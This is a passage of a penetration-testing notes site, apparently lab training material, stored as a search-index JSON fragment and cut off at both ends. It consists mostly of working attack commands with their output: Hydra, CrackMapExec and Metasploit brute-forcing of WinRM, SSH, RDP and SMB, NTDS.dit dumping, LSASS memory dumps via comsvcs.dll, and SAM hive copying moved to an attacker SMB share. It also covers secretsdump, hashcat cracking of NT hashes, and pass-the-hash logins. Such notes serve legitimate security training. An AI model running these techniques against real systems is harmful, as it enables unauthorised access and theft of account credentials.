10.129.42.197 -u user.list -p password.list\n\nWINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)\nWINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman\nWINRM       10.129.42.197   5985   NONE             [+] None\\user:password (Pwn3d!)\n</code></pre></p> <p>Evil-WinRM Usage <pre><code>secops@kali[/kali]$ evil-winrm -i 10.129.42.197 -u user -p password\n\nEvil-WinRM shell v3.3\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\user\\Documents&gt;\n</code></pre></p>  SSH <p>Hydra - SSH <pre><code>secops@kali[/kali]$ hydra -L user.list -P password.list ssh://10.129.42.197\n\nHydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task\n[DATA] attacking ssh://10.129.42.197:22/\n[22][ssh] host: 10.129.42.197   login: user   password: password\n1 of 1 target successfully completed, 1 valid password found\n</code></pre></p>  RDP <p>Hydra - RDP <pre><code>secops@kali[/kali]$ hydra -L user.list -P password.list rdp://10.129.42.197\n\nHydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40\n[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover\n[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)\n[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task\n[DATA] attacking rdp://10.129.42.197:3389/\n[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb0b password: rockstar, continuing attacking the account.\n[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cryanight password: delta, continuing attacking the account.\n[3389][rdp] host: 10.129.42.197   login: user   password: password\n1 of 1 target successfully completed, 1 valid password found\n</code></pre></p>  SMB <p>Hydra - SMB <pre><code>secops@kali[/kali]$ hydra -L user.list -P password.list smb://10.129.42.197\n\nHydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31\n[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\n[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task\n[DATA] attacking smb://10.129.42.197:445/\n[445][smb] host: 10.129.42.197   login: user   password: password\n1 of 1 target successfully completed, 1 valid passwords found\n</code></pre></p> <p>However, we may also get the following error describing that the server has sent an invalid reply. <pre><code>secops@kali[/kali]$ hydra -L user.list -P password.list smb://10.129.42.197\n\nHydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13\n[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)\n[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task\n[DATA] attacking smb://10.129.42.197:445/\n[ERROR] invalid reply from target smb://10.129.42.197:445/\n</code></pre></p> <p>This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile <code>hydra</code> or use MSF.</p> <pre><code>secops@kali[/kali]$ msfconsole -q\n\nmsf6 &gt; use auxiliary/scanner/smb/smb_login\nmsf6 auxiliary(scanner/smb/smb_login) &gt; options \n\nModule options (auxiliary/scanner/smb/smb_login):\n\n   Name               Current Setting  Required  Description\n   ----               ---------------  --------  -----------\n   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected\n   BLANK_PASSWORDS    false            no        Try blank passwords for all users\n   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5\n   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database\n   DB_ALL_PASS        false            no        Add all passwords in the current database to the list\n   DB_ALL_USERS       false            no        Add all users in the current database to the list\n   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&amp;realm)\n   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication\n   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user\n   PASS_FILE                           no        File containing passwords, one per line\n   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.\n   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]\n   RECORD_GUEST       false            no        Record guest-privileged random logins to the database\n   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit\n   RPORT              445              yes       The SMB service port (TCP)\n   SMBDomain          .                no        The Windows domain to use for authentication\n   SMBPass                             no        The password for the specified username\n   SMBUser                             no        The username to authenticate as\n   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host\n   THREADS            1                yes       The number of concurrent threads (max one per host)\n   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line\n   USER_AS_PASS       false            no        Try the username as the password for all users\n   USER_FILE                           no        File containing usernames, one per line\n   VERBOSE            true             yes       Whether to print output for all attempts\n\n\nmsf6 auxiliary(scanner/smb/smb_login) &gt; set user_file user.list\n\nuser_file =&gt; user.list\n\n\nmsf6 auxiliary(scanner/smb/smb_login) &gt; set pass_file password.list\n\npass_file =&gt; password.list\n\n\nmsf6 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10.129.42.197\n\nrhosts =&gt; 10.129.42.197\n\nmsf6 auxiliary(scanner/smb/smb_login) &gt; run\n\n[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\\user:password'\n[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <p>view the available shares and what privileges we have using <code>CrackMapExec</code> .</p> <pre><code>secops@kali[/kali]$ crackmapexec smb 10.129.42.197 -u \"user\" -p \"password\" --shares\n\nSMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)\nSMB         10.129.42.197   445    WINSRV           [+] WINSRV\\user:password \nSMB         10.129.42.197   445    WINSRV           [+] Enumerated shares\nSMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark\nSMB         10.129.42.197   445    WINSRV           -----           -----------     ------\nSMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin\nSMB         10.129.42.197   445    WINSRV           C$                              Default share\nSMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      \nSMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC\n</code></pre> <p>To communicate with the server via SMB, we can use smbclient. <pre><code>secops@kali[/kali]$ smbclient -U user \\\\\\\\10.129.42.197\\\\SHARENAME\n\nEnter WORKGROUP\\user's password: *******\n\nTry \"help\" to get a list of possible commands.\n\n\nsmb: \\&gt; ls\n  .                                  DR        0  Thu Jan  6 18:48:47 2022\n  ..                                 DR        0  Thu Jan  6 18:48:47 2022\n  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022\n\n                10328063 blocks of size 4096. 6074274 blocks available\nsmb: \\&gt; \n</code></pre></p>","title":"Network Services"},{"location":"password_attacks/remote_password_attacks/password_mutations/","text":"<p>Password List <pre><code>secops@kali[/kali]$ cat password.list\n\npassword\n</code></pre></p> <p>Hashcat Rule File</p> <pre><code>secops@kali[/kali]$ cat custom.rule\n\n:\nc\nso0\nc so0\nsa@\nc sa@\nc sa@ so0\n$!\n$! c\n$! so0\n$! sa@\n$! c so0\n$! c sa@\n$! so0 sa@\n$! c so0 sa@\n</code></pre> <p>Generating Rule-based Wordlist <pre><code>secops@kali[/kali]$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list\nsecops@kali[/kali]$ cat mut_password.list\n\npassword\nPassword\npassw0rd\nPassw0rd\np@ssword\nP@ssword\nP@ssw0rd\npassword!\nPassword!\npassw0rd!\np@ssword!\nPassw0rd!\nP@ssword!\np@ssw0rd!\nP@ssw0rd!\n</code></pre></p>","title":"Password Mutations"},{"location":"password_attacks/windows_local_password_attacks/attacking_ad_ntdsdit/","text":"Creating a Custom list of Usernames <p>We can manually create our list(s) or use an <code>automated list generator</code> such as the Ruby-based tool Username Anarchy to convert a list of real names into common username formats.</p> <pre><code>secops@kali[/kali]$ ./username-anarchy -i /home/ltnbob/names.txt \n\nben\nbenwilliamson\nben.williamson\nbenwilli\nbenwill\nbenw\nb.williamson\nbwilliamson\nwben\nw.ben\nwilliamsonb\nwilliamson\nwilliamson.b\nwilliamson.ben\nbw\nbob\nbobburgerstien\nbob.burgerstien\nbobburge\nbobburg\nbobb\nb.burgerstien\nbburgerstien\nbbob\nb.bob\nburgerstienb\nburgerstien\nburgerstien.b\nburgerstien.bob\nbb\n&lt;SNIP&gt;\n</code></pre> <p>Launching the Attack with CrackMapExec</p> <pre><code>secops@kali[/kali]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt\n\nSMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)\nSMB         10.129.201.57     445    DC01             [-] legalcorp.local.local\\bwilliamson:winter2017 STATUS_LOGON_FAILURE \nSMB         10.129.201.57     445    DC01             [-] legalcorp.local.local\\bwilliamson:winter2016 STATUS_LOGON_FAILURE \nSMB         10.129.201.57     445    DC01             [-] legalcorp.local.local\\bwilliamson:winter2015 STATUS_LOGON_FAILURE \nSMB         10.129.201.57     445    DC01             [-] legalcorp.local.local\\bwilliamson:winter2014 STATUS_LOGON_FAILURE \nSMB         10.129.201.57     445    DC01             [-] legalcorp.local.local\\bwilliamson:winter2013 STATUS_LOGON_FAILURE \nSMB         10.129.201.57     445    DC01             [-] legalcorp.local.local\\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE \nSMB         10.129.201.57     445    DC01             [-] legalcorp.local.local\\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE \nSMB         10.129.201.57     445    DC01             [+] legalcorp.local.local\\bwilliamson:P@55w0rd! \n</code></pre>  Capturing NTDS.dit <p><code>NT Directory Services</code> (<code>NTDS</code>) is the directory service used with AD to find &amp; organize network resources. <code>NTDS.dit</code> file is stored at <code>%systemroot$/ntds</code> on the domain controllers in a forest. The <code>.dit</code> stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain</p> <p>Connecting to a DC with Evil-WinRM <pre><code>secops@kali[/kali]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'\n</code></pre></p> <p>Once connected, we can check to see what privileges bwilliamson has.  <pre><code>*Evil-WinRM* PS C:\\&gt; net localgroup\n\nAliases for \\\\DC01\n\n-------------------------------------------------------------------------------\n*Access Control Assistance Operators\n*Account Operators\n*Administrators\n*Allowed RODC Password Replication Group\n*Backup Operators\n*Cert Publishers\n*Certificate Service DCOM Access\n*Cryptographic Operators\n*Denied RODC Password Replication Group\n*Distributed COM Users\n*DnsAdmins\n*Event Log Readers\n*Guests\n*Hyper-V Administrators\n*IIS_IUSRS\n*Incoming Forest Trust Builders\n*Network Configuration Operators\n*Performance Log Users\n*Performance Monitor Users\n*Pre-Windows 2000 Compatible Access\n*Print Operators\n*RAS and IAS Servers\n*RDS Endpoint Servers\n*RDS Management Servers\n*RDS Remote Access Servers\n*Remote Desktop Users\n*Remote Management Users\n*Replicator\n*Server Operators\n*Storage Replica Administrators\n*Terminal Server License Servers\n*Users\n*Windows Authorization Access Group\nThe command completed successfully.\n</code></pre></p> <p>We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (<code>Administrators group</code>) or Domain Admin (<code>Domain Admins group</code>) (or equivalent) rights. We also will want to check what domain privileges we have.</p> <pre><code>*Evil-WinRM* PS C:\\&gt; net user bwilliamson\n\nUser name                    bwilliamson\nFull Name                    Ben Williamson\nComment\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            1/13/2022 12:48:58 PM\nPassword expires             Never\nPassword changeable          1/14/2022 12:48:58 PM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   1/14/2022 2:07:49 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships\nGlobal Group memberships     *Domain Users         *Domain Admins\nThe command completed successfully.\n</code></pre> <p>This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.</p> <pre><code>secops@kali[/kali]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds\n\nSMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:legalcorp.local.local) (signing:True) (SMBv1:False)\nSMB         10.129.201.57    445     DC01             [+] legalcorp.local.local\\bwilliamson:P@55w0rd! (Pwn3d!)\nSMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...\nSMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\nSMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.129.201.57    445     DC01           DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::\nSMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::\nSMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::\nSMB         10.129.201.57    445     DC01           WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::\nSMB         10.129.201.57    445     DC01           WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::\nSMB         10.129.201.57    445     DC01           WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::\nSMB         10.129.201.57    445     DC01           WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::\nSMB         10.129.201.57    445     DC01           WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\nSMB         10.129.201.57    445     DC01           Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552\nSMB         10.129.201.57    445     DC01           Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb\nSMB         10.129.201.57    445     DC01           Administrator:des-cbc-md5:618c1c5ef780cde3\nSMB         10.129.201.57    445     DC01           DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9\nSMB         10.129.201.57    445     DC01           DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d\nSMB         10.129.201.57    445     DC01           DC01$:des-cbc-md5:a2852362e50eae92\nSMB         10.129.201.57    445     DC01           krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9\nSMB         10.129.201.57    445     DC01           krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9\nSMB         10.129.201.57    445     DC01           krbtgt:des-cbc-md5:9bd5017fdcea8fae\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263\nSMB         10.129.201.57    445     DC01           legalcorp.local.local\\jim:des-cbc-md5:79ab08755b32dfb6\nSMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d\nSMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-\n     [+] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database\n</code></pre>  Cracking Hashes &amp; Gaining Credentials <p>We can proceed with creating a text file containing all the NT hashes, or we can individually copy &amp; paste a specific hash into a terminal session and use Hashcat to attempt to crack the hash and a password in cleartext. <pre><code>secops@kali[/kali]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt\n\n64f12cddaa88057e06a81b54e73b949b:Password1\n</code></pre></p>  Pass-the-Hash Considerations <p>What if we are unsuccessful in cracking a hash? We can still use hashes to attempt to authenticate with a system using a type of attack called <code>Pass-the-Hash</code> (<code>PtH</code>). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of <code>username</code>:<code>clear-text password</code> as the format for login, we can instead use <code>username</code>:<code>password hash</code>.</p> <pre><code>secops@kali[/kali]$ evil-winrm -i 10.129.201.57  -u  Administrator -H \"64f12cddaa88057e06a81b54e73b949b\"\n</code></pre> <p>We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.</p>","title":"Attacking AD & NTDS.dit"},{"location":"password_attacks/windows_local_password_attacks/attacking_lsass/","text":"Dumping LSASS Process Memory <p>Task Manager Method</p> <p><code>Open Task Manager &gt; Select the Processes tab &gt; Find &amp; right click the Local Security Authority Process &gt; Select Create dump file</code></p> <p>A file called <code>lsass.DMP</code> is created and saved in: <pre><code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp\n</code></pre></p> <p>This is the file we will transfer to our attack host. We can use the impacket/smbserver file transfer method to transfer file to our attack host.</p> <p>Rundll32.exe &amp; Comsvcs.dll Method</p> <p>Finding LSASS PID in cmd <pre><code>C:\\Windows\\system32&gt; tasklist /svc\n\nImage Name                     PID Services\n========================= ======== ============================================\nSystem Idle Process              0 N/A\nSystem                           4 N/A\nRegistry                        96 N/A\nsmss.exe                       344 N/A\ncsrss.exe                      432 N/A\nwininit.exe                    508 N/A\ncsrss.exe                      520 N/A\nwinlogon.exe                   580 N/A\nservices.exe                   652 N/A\nlsass.exe                      672 KeyIso, SamSs, VaultSvc\nsvchost.exe                    776 PlugPlay\nsvchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,\n                                   SystemEventsBroker\nfontdrvhost.exe                812 N/A\n</code></pre></p> <p>Finding LSASS PID in PowerShell <pre><code>PS C:\\Windows\\system32&gt; Get-Process lsass\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n   1260      21     4948      15396       2.56    672   0 lsass\n</code></pre></p> <p>Once we have the PID assigned to the LSASS process, we can create the dump file. <pre><code>PS C:\\Windows\\system32&gt; rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full\n</code></pre></p> <p>Most modern AV tools recognize this as malicious and prevent the command from executing.</p>  Using Pypykatz to Extract Credentials <p>LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a \"snapshot\" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.</p> <pre><code>secops@kali[/kali]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp \n\nINFO:root:Parsing file /home/peter/Documents/lsass.dmp\nFILE: ======== /home/peter/Documents/lsass.dmp =======\n== LogonSession ==\nauthentication_id 1354633 (14ab89)\nsession_id 2\nusername bob\ndomainname DESKTOP-33E7O54\nlogon_server WIN-6T0C3J2V6HP\nlogon_time 2021-12-14T18:14:25.514306+00:00\nsid S-1-5-21-4019466498-1700476312-3544718034-1001\nluid 1354633\n    == MSV ==\n        Username: bob\n        Domain: DESKTOP-33E7O54\n        LM: NA\n        NT: 64f12cddaa88057e06a81b54e73b949b\n        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8\n        DPAPI: NA\n    == WDIGEST [14ab89]==\n        username bob\n        domainname DESKTOP-33E7O54\n        password None\n        password (hex)\n    == Kerberos ==\n        Username: bob\n        Domain: DESKTOP-33E7O54\n    == WDIGEST [14ab89]==\n        username bob\n        domainname DESKTOP-33E7O54\n        password None\n        password (hex)\n    == DPAPI [14ab89]==\n        luid 1354633\n        key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b\n        masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92\n        sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605\n\n== LogonSession ==\nauthentication_id 1354581 (14ab55)\nsession_id 2\nusername bob\ndomainname DESKTOP-33E7O54\nlogon_server WIN-6T0C3J2V6HP\nlogon_time 2021-12-14T18:14:25.514306+00:00\nsid S-1-5-21-4019466498-1700476312-3544718034-1001\nluid 1354581\n    == MSV ==\n        Username: bob\n        Domain: DESKTOP-33E7O54\n        LM: NA\n        NT: 64f12cddaa88057e06a81b54e73b949b\n        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8\n        DPAPI: NA\n    == WDIGEST [14ab55]==\n        username bob\n        domainname DESKTOP-33E7O54\n        password None\n        password (hex)\n    == Kerberos ==\n        Username: bob\n        Domain: DESKTOP-33E7O54\n    == WDIGEST [14ab55]==\n        username bob\n        domainname DESKTOP-33E7O54\n        password None\n        password (hex)\n\n== LogonSession ==\nauthentication_id 1343859 (148173)\nsession_id 2\nusername DWM-2\ndomainname Window Manager\nlogon_server \nlogon_time 2021-12-14T18:14:25.248681+00:00\nsid S-1-5-90-0-2\nluid 1343859\n    == WDIGEST [148173]==\n        username WIN-6T0C3J2V6HP$\n        domainname WORKGROUP\n        password None\n        password (hex)\n    == WDIGEST [148173]==\n        username WIN-6T0C3J2V6HP$\n        domainname WORKGROUP\n        password None\n        password (hex)\n</code></pre> <p>Cracking the NT Hash with Hashcat <pre><code>secops@kali[/kali]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt\n\n64f12cddaa88057e06a81b54e73b949b:Password1\n</code></pre></p>","title":"Attacking LSASS"},{"location":"password_attacks/windows_local_password_attacks/attacking_sam/","text":"<p>There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes.</p>    Registry Hive Description     <code>hklm\\sam</code> Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.   <code>hklm\\system</code> Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.   <code>hklm\\security</code> Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.    Using reg.exe save to Copy Registry Hives <pre><code>C:\\WINDOWS\\system32&gt; reg.exe save hklm\\sam C:\\sam.save\n\nThe operation completed successfully.\n\nC:\\WINDOWS\\system32&gt; reg.exe save hklm\\system C:\\system.save\n\nThe operation completed successfully.\n\nC:\\WINDOWS\\system32&gt; reg.exe save hklm\\security C:\\security.save\n\nThe operation completed successfully.\n</code></pre> <p>Technically we will only need <code>hklm\\sam</code> &amp; <code>hklm\\system</code>, but <code>hklm\\security</code> can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.</p> <p>Creating a Share with smbserver.py <pre><code>secops@kali[/kali]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre></p> <p>Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.</p> <pre><code>C:\\&gt; move sam.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\n\nC:\\&gt; move security.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\n\nC:\\&gt; move system.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\n</code></pre> <p>Confirming Hive Copies Transferred to Attack Host <pre><code>secops@kali[/kali]$ ls\n\nsam.save  security.save  system.save\n</code></pre></p> <p>Run secretsdump.py using Python, then specify each hive file we retrieved from the target host. <pre><code>secops@kali[/kali]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::\ndefaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::\nbob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\nsam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::\nrocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::\nITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::\n[*] Dumping cached domain logon information (domain/username:hash)\n[*] Dumping LSA Secrets\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643\ndpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362\n[*] NL$KM \n 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....&gt;w4...}..`i\n 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.\n 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(\n 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB\nNL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42\n[*] Cleaning up... \n</code></pre></p> <p>Here we see that secretsdump successfully dumps the <code>local</code> SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\\security.</p> <p>Notice at the top of the secretsdump.py output: <pre><code>Dumping local SAM hashes (uid:rid:lmhash:nthash)\n</code></pre> This tells us how to read the output and what hashes we can crack.</p>  Cracking Hashes with Hashcat <p>Adding nthashes to a .txt File <pre><code>secops@kali[/kali]$ sudo vim hashestocrack.txt\n\n64f12cddaa88057e06a81b54e73b949b\n31d6cfe0d16ae931b73c59d7e0c089c0\n6f8c3f4d3869a10f3b4f0522f537fd33\n184ecdda8cf1dd238d438c4aea4d560d\nf7eb9c06fafaa23c4bcf22ba6781c1e2\n</code></pre></p> <p>Running Hashcat against NT Hashes <pre><code>secops@kali[/kali]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt\n\nhashcat (v6.1.1) 